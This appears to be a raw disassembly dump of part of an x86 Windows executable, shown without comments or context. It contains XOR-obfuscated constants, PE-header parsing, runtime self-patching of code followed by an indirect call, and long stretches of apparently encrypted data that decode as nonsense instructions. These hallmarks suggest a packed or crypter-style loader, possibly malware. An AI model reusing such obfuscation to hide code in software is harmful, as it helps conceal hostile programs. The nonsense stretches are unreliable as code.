  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xbcca88a8,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1d1
  40a236:	xchg   esp,eax
  40a237:	fwait
  40a238:	or     DWORD PTR [esi+0xd],esp
  40a23b:	shl    BYTE PTR [esi-0x59ec5680],cl
  40a241:	push   ecx
  40a242:	sar    DWORD PTR [ebp-0x48],cl
  40a245:	push   ecx
  40a246:	shr    BYTE PTR [eax-0xbc2794f],cl
  40a24c:	je     0x40a25c
  40a24e:	inc    edi
  40a24f:	shr    ecx,1
  40a251:	scas   eax,DWORD PTR es:[edi]
  40a252:	xor    al,0x79
  40a254:	jl     0x40a2c7
  40a256:	jnp    0x40a288
  40a258:	fsub   QWORD PTR [eax]
  40a25a:	mov    edi,0x2a271e27
  40a25f:	in     al,dx
  40a260:	adc    esi,eax
  40a262:	cmp    dh,BYTE PTR [edx+0x7655fe2a]
  40a268:	es (bad) 
  40a26a:	es sub al,0x99
  40a26d:	mov    ch,0xbd
  40a26f:	push   esp
  40a270:	mov    edx,0x69776799
  40a275:	(bad)  [ebp+0x1f7ef29]
  40a27b:	jo     0x40a262
  40a27d:	mov    DWORD PTR [eax-0x2fb4efa3],esi
  40a283:	sub    eax,0x4c4b3b3c
  40a288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a289:	pop    ebp
  40a28a:	cmp    al,BYTE PTR es:[edx+esi*4+0xb]
  40a28f:	sbb    DWORD PTR [eax],ebx
  40a291:	popa   
  40a292:	add    eax,0xbc09dc58
  40a297:	inc    esi
  40a298:	imul   ebx,ecx,0xc93a57c0
  40a29e:	into   
  40a29f:	sbb    al,0x94
  40a2a1:	cmc    
  40a2a2:	lahf   
  40a2a3:	xchg   BYTE PTR ds:0x897695ff,dh
  40a2a9:	adc    eax,0x241d15da
  40a2ae:	and    eax,0xd43a8c83
  40a2b3:	pop    esp
  40a2b4:	loope  0x40a2d4
  40a2b6:	mov    ah,0x97
  40a2b8:	mov    ch,0x6c
  40a2ba:	mov    ss,WORD PTR [eax]
  40a2bc:	sar    BYTE PTR [ebx],cl
  40a2be:	int    0x85
  40a2c0:	or     DWORD PTR [eax+0x3a],eax
  40a2c3:	inc    edx
  40a2c4:	pusha  
  40a2c5:	jno    0x40a26c
  40a2c7:	iret   
  40a2c8:	repz or DWORD PTR [edx],ecx
  40a2cb:	sub    eax,0x48d16e3
  40a2d0:	ret    0x594a
  40a2d3:	shr    BYTE PTR [edi+0x52],0x7c
  40a2d7:	sahf   
  40a2d8:	pushf  
  40a2d9:	jp     0x40a33d
  40a2db:	add    eax,0xb4c52ec8
  40a2e0:	xchg   edi,eax
  40a2e1:	fst    DWORD PTR [ebp-0x6f]
  40a2e4:	(bad)  
  40a2e5:	(bad)  
  40a2e6:	mov    ah,0xbd
  40a2e8:	add    al,0xfe
  40a2ea:	cmp    BYTE PTR [esi],dh
  40a2ec:	dec    ebx
  40a2ed:	jge    0x40a36c
  40a2ef:	popa   
  40a2f0:	(bad)  
  40a2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f2:	xor    eax,0xa80c5055
  40a2f7:	std    
  40a2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f9:	xor    al,0x8e
  40a2fb:	lods   al,BYTE PTR ds:[esi]
  40a2fc:	cwde   
  40a2fd:	adc    ebx,DWORD PTR [edi]
  40a2ff:	inc    edx
  40a300:	pop    edi
  40a301:	fadd   DWORD PTR [ecx+0x42c55b71]
  40a307:	(bad)  
  40a308:	jno    0x40a2dd
  40a30a:	outs   dx,BYTE PTR ds:[esi]
  40a30b:	inc    edx
  40a30c:	pop    edi
  40a30d:	ud2    
  40a30f:	mov    dl,0x4a
  40a311:	es mov ecx,cs
  40a314:	mov    eax,0x2fdfa956
  40a319:	mov    dh,0xc2
  40a31b:	sti    
  40a31c:	xchg   esi,eax
  40a31d:	xchg   esp,eax
  40a31e:	dec    ebx
  40a31f:	loop   0x40a2ab
  40a321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a322:	adc    esp,DWORD PTR [ebx]
  40a324:	retf   0xde69
  40a327:	dec    edx
  40a328:	imul   ebx,DWORD PTR [eax+0x74],0xf
  40a32c:	das    
  40a32d:	jecxz  0x40a30f
  40a32f:	scas   eax,DWORD PTR es:[edi]
  40a330:	fmul   QWORD PTR [ebp-0x3c67ce23]
  40a336:	cs and eax,0xa1691472
  40a33c:	iret   
  40a33d:	sub    ebx,DWORD PTR [ebp+0x22]
  40a340:	push   ebx
  40a341:	add    bl,BYTE PTR [ebp-0x9]
  40a344:	mov    ds:0xb2ded9e3,al
  40a349:	sub    cl,dh
  40a34b:	inc    edi
  40a34c:	rol    esi,0xb0
  40a34f:	or     eax,0x725e09da
  40a354:	sub    eax,0x46c3f3ae
  40a359:	mov    ch,0xde
  40a35b:	enter  0xa145,0xfd
  40a35f:	cld    
  40a360:	jge    0x40a31e
  40a362:	jg     0x40a351
  40a364:	push   es
  40a365:	add    cl,BYTE PTR [ebx+0x75]
  40a368:	and    al,0xfd
  40a36a:	pop    edi
  40a36b:	out    0xdb,eax
  40a36d:	pop    ebp
  40a36e:	mov    edi,0xc954bde0
  40a373:	dec    ebx
  40a374:	ins    BYTE PTR es:[edi],dx
  40a375:	add    edi,0x30
  40a378:	ja     0x40a34d
  40a37a:	pcmpgtw mm1,QWORD PTR [edx]
  40a37d:	iret   
  40a37e:	iret   
  40a37f:	pop    eax
  40a380:	sub    DWORD PTR [edx+0x1b],esi
  40a383:	jge    0x40a3d3
  40a385:	ds dec esi
  40a387:	push   ebp
  40a388:	lods   eax,DWORD PTR ds:[esi]
  40a389:	fcomp  QWORD PTR [ebx-0xd]
  40a38c:	push   0x35
  40a38e:	aas    
  40a38f:	add    esi,esp
  40a391:	data16 (bad) 
  40a393:	pop    esi
  40a394:	jp     0x40a3b4
  40a396:	call   0x78b7:0xdfbd2a80
  40a39d:	dec    edx
  40a39e:	lock and eax,0x268a67a6
  40a3a4:	xchg   edx,eax
  40a3a5:	dec    ecx
  40a3a6:	lea    ebp,[ebx+0x20]
  40a3a9:	ss cwde 
  40a3ab:	outs   dx,BYTE PTR ds:[esi]
  40a3ac:	xor    al,bh
  40a3ae:	inc    esi
  40a3af:	or     eax,0x2fee472d
  40a3b4:	imul   esp,DWORD PTR [ecx+0x12e9b6a8],0xf63ffa87
  40a3be:	fbld   TBYTE PTR [ebx-0x3e1dbc3]
  40a3c4:	lahf   
  40a3c5:	stos   DWORD PTR es:[edi],eax
  40a3c6:	retf   0x8a6
  40a3c9:	shl    DWORD PTR [ebx],0xb3
  40a3cc:	jb     0x40a43b
  40a3ce:	add    bh,BYTE PTR [esi-0x3c5860b7]
  40a3d4:	fmul   st,st(0)
  40a3d6:	ins    DWORD PTR es:[edi],dx
  40a3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3d8:	(bad)  
  40a3d9:	jnp    0x40a3d9
  40a3db:	push   ss
  40a3dc:	and    al,BYTE PTR [ebx]
  40a3de:	xchg   DWORD PTR [ebp+0x7a],ebp
  40a3e1:	xor    DWORD PTR [edi],0x822a9d48
  40a3e7:	je     0x40a3c4
  40a3e9:	loop   0x40a37f
  40a3eb:	sub    DWORD PTR [eax-0x1b],eax
  40a3ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3ef:	and    ecx,ebx
  40a3f1:	push   ds
  40a3f2:	xchg   ebp,eax
  40a3f3:	push   es
  40a3f4:	sar    DWORD PTR [ebx+eiz*8+0x14cfedde],0x75
  40a3fc:	iret   
  40a3fd:	arpl   WORD PTR [esp+edi*8-0x6621236d],bp
  40a404:	mov    dl,0xbf
  40a406:	in     al,0x4f
  40a408:	pop    DWORD PTR [edi]
  40a40a:	jno    0x40a3c8
  40a40c:	out    dx,al
  40a40d:	ins    BYTE PTR es:[edi],dx
  40a40e:	icebp  
  40a40f:	xchg   ebp,eax
  40a410:	sahf   
  40a411:	ja     0x40a408
  40a413:	lods   al,BYTE PTR ds:[esi]
  40a414:	and    DWORD PTR [ecx],ebp
  40a416:	pop    eax
  40a417:	adc    edx,eax
  40a419:	sti    
  40a41a:	jo     0x40a3ac
  40a41c:	pop    edx
  40a41d:	adc    ecx,DWORD PTR [edi]
  40a41f:	sub    al,0x15
  40a421:	jle    0x40a421
  40a423:	and    dl,bh
  40a425:	out    0xdb,eax
  40a427:	mov    bl,0x71
  40a429:	jno    0x40a43f
  40a42b:	push   esi
  40a42c:	cmp    DWORD PTR [edx-0x5e5072e2],0xca7f27d0
  40a436:	loope  0x40a3bd
  40a438:	(bad)  
  40a439:	in     al,dx
  40a43a:	mov    al,0xfd
  40a43c:	or     eax,0x5fd56af8
  40a441:	into   
  40a442:	xchg   ebp,eax
  40a443:	das    
  40a444:	mov    es,ecx
  40a446:	(bad)  
  40a447:	mov    ebx,0xb70bec3f
  40a44c:	fisttp WORD PTR [ecx-0x57ef83ad]
  40a452:	add    DWORD PTR [ebx-0x4da3dab6],ebx
  40a458:	jno    0x40a451
  40a45a:	loope  0x40a3dc
  40a45c:	mov    ds:0xc5cffc52,eax
  40a461:	jecxz  0x40a4ad
  40a463:	nop
  40a464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a465:	sub    DWORD PTR [ebp+0x7b],esp
  40a468:	in     eax,dx
  40a469:	xchg   DWORD PTR [ebx-0x18db8668],ecx
  40a46f:	lahf   
  40a470:	pushf  
  40a471:	add    ebp,DWORD PTR [ebx+0x25839f6a]
  40a477:	je     0x40a488
  40a479:	inc    ecx
  40a47a:	js     0x40a468
  40a47c:	dec    esi
  40a47d:	mov    eax,ds:0x8ec4b3be
  40a482:	jg     0x40a4ac
  40a484:	inc    eax
  40a485:	ja     0x40a43a
  40a487:	or     ebp,DWORD PTR [ebx]
  40a489:	inc    eax
  40a48a:	mov    dl,0xef
  40a48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a48d:	ins    BYTE PTR es:[edi],dx
  40a48e:	lea    edx,[edx-0x6729c9a2]
  40a494:	xor    al,0x5d
  40a496:	mov    eax,DWORD PTR [ebp+0x8]
  40a499:	mov    DWORD PTR ds:0x430542,0x17
  40a4a3:	cmp    DWORD PTR ds:0x430542,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0xcb5a360
  40a537:	out    dx,eax
  40a538:	jns    0x40a4ee
  40a53a:	call   0x712023bd
  40a53f:	jle    0x40a5bf
  40a541:	adc    BYTE PTR [eax-0xb08e9e5],ch
  40a547:	scas   al,BYTE PTR es:[edi]
  40a548:	nop
  40a549:	sbb    eax,0xca123e20
  40a54e:	mov    BYTE PTR [ecx],dl
  40a550:	and    eax,0xf97809fd
  40a555:	sbb    al,0xd4
  40a557:	fnclex 
  40a559:	add    esp,DWORD PTR [eax]
  40a55b:	aam    0xcc
  40a55d:	or     ebp,DWORD PTR [ecx+ebx*8-0x65]
  40a561:	adc    cl,BYTE PTR [ecx+0x7300d5b9]
  40a567:	or     al,0xa8
  40a569:	add    ah,BYTE PTR [ebp-0x2f2578b4]
  40a56f:	push   cs
  40a570:	sbb    ebp,esp
  40a572:	mov    eax,0x6d4a89d4
  40a577:	or     al,0xfa
  40a579:	imul   esp,DWORD PTR [edx-0x6b1a264c],0xffffffb1
  40a580:	sti    
  40a581:	cld    
  40a582:	stos   DWORD PTR es:[edi],eax
  40a583:	(bad)  
  40a584:	sub    BYTE PTR [ebx+0x3c7e904f],bl
  40a58a:	loopne 0x40a57b
  40a58c:	out    dx,al
  40a58d:	rol    edx,cl
  40a58f:	push   ss
  40a590:	or     dh,BYTE PTR [edi+0x60]
  40a593:	pop    ecx
  40a594:	xchg   DWORD PTR [eax-0x40f97f53],esp
  40a59a:	mov    dh,0xd5
  40a59c:	pusha  
  40a59d:	sub    BYTE PTR ds:0x89cab3a,ah
  40a5a3:	ret    0x38c9
  40a5a6:	sbb    ah,cl
  40a5a8:	xchg   edx,eax
  40a5a9:	out    dx,al
  40a5aa:	retf   0x4e10
  40a5ad:	(bad)  
  40a5ae:	xchg   ecx,eax
  40a5af:	xchg   DWORD PTR [esi-0x33b43fe5],ebp
  40a5b5:	(bad)
  40a5b9:	xchg   ecx,eax
  40a5ba:	pushf  
  40a5bb:	mov    eax,0x7731ebf4
  40a5c0:	fs push edx
  40a5c2:	cmp    eax,0x2a85a50e
  40a5c7:	dec    ebp
  40a5c8:	jl     0x40a58d
  40a5ca:	mov    esi,DWORD PTR [esi-0x77]
  40a5cd:	push   0x97d6b2de
  40a5d2:	pushf  
  40a5d3:	int    0x7
  40a5d5:	les    eax,FWORD PTR [edx-0x1ad053bc]
  40a5db:	fwait
  40a5dc:	imul   eax,DWORD PTR [edx],0x665de29a
  40a5e2:	push   0x1df4199a
  40a5e7:	out    0xf1,al
  40a5e9:	inc    DWORD PTR [edi-0x25]
  40a5ec:	sub    al,0x5a
  40a5ee:	sahf   
  40a5ef:	jno    0x40a5cb
  40a5f1:	push   ds
  40a5f2:	lods   eax,DWORD PTR ds:[esi]
  40a5f3:	in     al,0x74
  40a5f5:	(bad)  
  40a5f6:	(bad)  
  40a5f7:	xchg   ebp,eax
  40a5f8:	mov    esi,0x9370a099
  40a5fd:	inc    ebx
  40a5fe:	aas    
  40a5ff:	lahf   
  40a600:	rol    BYTE PTR [ebx+0x5b076a6a],cl
  40a606:	cmp    eax,0x49de06b3
  40a60b:	sub    edi,ecx
  40a60d:	sbb    bl,BYTE PTR [edi+eax*8+0x15d30a63]
  40a614:	mov    esp,0x351c8311
  40a619:	sbb    ebx,ecx
  40a61b:	rol    al,1
  40a61d:	jle    0x40a62a
  40a61f:	das    
  40a620:	add    al,0xd6
  40a622:	call   0xc86b8b11
  40a627:	adc    al,0x5c
  40a629:	mov    al,ds:0xdec61dad
  40a62e:	fsubr  st(6),st
  40a630:	int    0xd4
  40a632:	cmp    al,0x30
  40a634:	push   edi
  40a635:	sub    ah,dl
  40a637:	xor    BYTE PTR [esi+0x13eefd62],ch
  40a63d:	sbb    DWORD PTR [ecx+edi*8-0x7521827c],esp
  40a644:	push   eax
  40a645:	or     bh,BYTE PTR [esi+edi*4-0x47]
  40a649:	in     al,0xdf
  40a64b:	add    DWORD PTR [edi+edi*1+0x5909ba38],esi
  40a652:	retf   
  40a653:	push   esp
  40a654:	xchg   ebp,eax
  40a655:	dec    edi
  40a656:	and    edi,DWORD PTR [ebx]
  40a658:	xchg   ecx,eax
  40a659:	dec    ebp
  40a65a:	mov    cs,WORD PTR [ecx+0xa]
  40a65d:	jbe    0x40a62f
  40a65f:	push   ebx
  40a660:	pop    esp
  40a661:	push   ss
  40a662:	sbb    eax,0x14e461aa
  40a667:	push   ebp
  40a668:	xor    esi,DWORD PTR [ecx-0x4e65aced]
  40a66e:	cmp    esi,DWORD PTR [esi+0x1f8e7b3b]
  40a674:	add    BYTE PTR [edi],ah
  40a676:	addr16 push edx
  40a678:	mov    ss:0xd3b86ba9,al
  40a67e:	inc    edi
  40a67f:	cmp    al,0xa6
  40a681:	adc    BYTE PTR [edx+ebx*4-0x39],dl
  40a685:	xor    dh,bh
  40a687:	sub    DWORD PTR [ebp+0x71],esp
  40a68a:	inc    edi
  40a68b:	jns    0x40a66a
  40a68d:	addr16 in eax,dx
  40a68f:	rcl    dl,cl
  40a691:	mov    dl,BYTE PTR ds:0xbb2d38d1
  40a697:	in     eax,dx
  40a698:	dec    esi
  40a699:	jp     0x40a69c
  40a69b:	cmp    al,0x6
  40a69d:	mov    eax,0x4e74bdae
  40a6a2:	cmp    al,0xec
  40a6a4:	ds mov cl,0xa9
  40a6a7:	cmp    DWORD PTR [edi],0x1aacdf54
  40a6ad:	in     eax,0x1a
  40a6af:	push   0x6080300
  40a6b4:	push   ds
  40a6b5:	stc    
  40a6b6:	pushf  
  40a6b7:	jno    0x40a665
  40a6b9:	inc    ebx
  40a6ba:	aas    
  40a6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6bc:	pop    eax
  40a6bd:	or     ecx,eax
  40a6bf:	cmc    
  40a6c0:	push   cs
  40a6c1:	repz (bad) 
  40a6c3:	sub    cl,BYTE PTR [ecx+0x5357c452]
  40a6c9:	fdivr  st,st(0)
  40a6cb:	jmp    FWORD PTR [edi]
  40a6cd:	jecxz  0x40a719
  40a6cf:	retf   0xb467
  40a6d2:	or     eax,0x130bedaa
  40a6d7:	push   esp
  40a6d8:	mov    al,0x66
  40a6da:	out    0xef,eax
  40a6dc:	rcr    DWORD PTR [ebx+0x5cc15ee3],0x77
  40a6e3:	(bad)  
  40a6e4:	xchg   esi,eax
  40a6e5:	sub    DWORD PTR [ecx-0x53],esp
  40a6e8:	jle    0x40a730
  40a6ea:	xor    ch,ch
  40a6ec:	add    BYTE PTR [esp+ecx*8+0x5d],cl
  40a6f0:	fsubr  DWORD PTR [eax-0x1b]
  40a6f3:	jg     0x40a753
  40a6f5:	xlat   BYTE PTR ds:[ebx]
  40a6f6:	dec    esi
  40a6f7:	mov    edx,0xf3189f26
  40a6fc:	push   edi
  40a6fd:	xchg   ebp,eax
  40a6fe:	push   esp
  40a6ff:	fmul   QWORD PTR [ebp-0x2aaac314]
  40a705:	lods   eax,DWORD PTR ds:[esi]
  40a706:	jns    0x40a74b
  40a708:	outs   dx,DWORD PTR ds:[esi]
  40a709:	ins    BYTE PTR es:[edi],dx
  40a70a:	fs jmp 0x40a6df
  40a70d:	pop    edx
  40a70e:	cmp    edx,DWORD PTR [edx+0x531bebf1]
  40a714:	retf   0x4eaa
  40a717:	icebp  
  40a718:	iret   
  40a719:	test   eax,0xae3038e6
  40a71e:	jbe    0x40a6ef
  40a720:	push   cs
  40a721:	sub    ebx,DWORD PTR [ecx-0x2b4a8f04]
  40a727:	adc    al,0x14
  40a729:	leavew 
  40a72b:	xchg   edx,eax
  40a72c:	xor    BYTE PTR [edx-0x31],bl
  40a72f:	xor    BYTE PTR [ecx+0x6dddf6bc],bh
  40a735:	lahf   
  40a736:	out    0x43,al
  40a738:	lahf   
  40a739:	sub    dh,BYTE PTR [ecx+edi*4+0x59]
  40a73d:	into   
  40a73e:	mov    al,ds:0xec76d40d
  40a743:	(bad)  
  40a744:	scas   eax,DWORD PTR es:[edi]
  40a745:	ins    DWORD PTR es:[edi],dx
  40a746:	push   0x66dfc1a5
  40a74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74c:	ret    
  40a74d:	dec    esi
  40a74e:	mov    esi,0xd117c96c
  40a753:	mov    ah,0xc2
  40a755:	pop    ss
  40a756:	out    dx,al
  40a757:	pop    ecx
  40a758:	mov    ah,0xde
  40a75a:	call   DWORD PTR ds:0xcc9d47eb
  40a760:	cwde   
  40a761:	nop
  40a762:	rcl    ch,cl
  40a764:	retf   
  40a765:	lods   al,BYTE PTR ds:[esi]
  40a766:	sub    DWORD PTR [eax+0x7e487735],esp
  40a76c:	or     DWORD PTR [ecx],edi
  40a76e:	adc    ecx,DWORD PTR [ecx+0x16ec52e0]
  40a774:	inc    BYTE PTR [edi+0x1b]
  40a777:	nop
  40a778:	xchg   edi,eax
  40a779:	loopne 0x40a7f5
  40a77b:	pop    esp
  40a77c:	inc    edx
  40a77d:	push   edi
  40a77e:	(bad)  
  40a77f:	sbb    dl,ah
  40a781:	xchg   esi,eax
  40a782:	xchg   ecx,eax
  40a783:	out    0x1c,al
  40a785:	mov    esi,esi
  40a787:	mov    bh,BYTE PTR [edi-0x33446123]
  40a78d:	sub    BYTE PTR [edi],bl
  40a78f:	fst    DWORD PTR [esi]
  40a791:	(bad)  
  40a792:	mov    al,0xb2
  40a794:	dec    esp
  40a795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a796:	loope  0x40a79e
  40a798:	out    dx,eax
  40a799:	dec    ecx
  40a79a:	inc    ecx
  40a79b:	ins    BYTE PTR es:[edi],dx
  40a79c:	cmp    dl,dh
  40a79e:	out    0x32,al
  40a7a0:	std    
  40a7a1:	dec    ebx
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
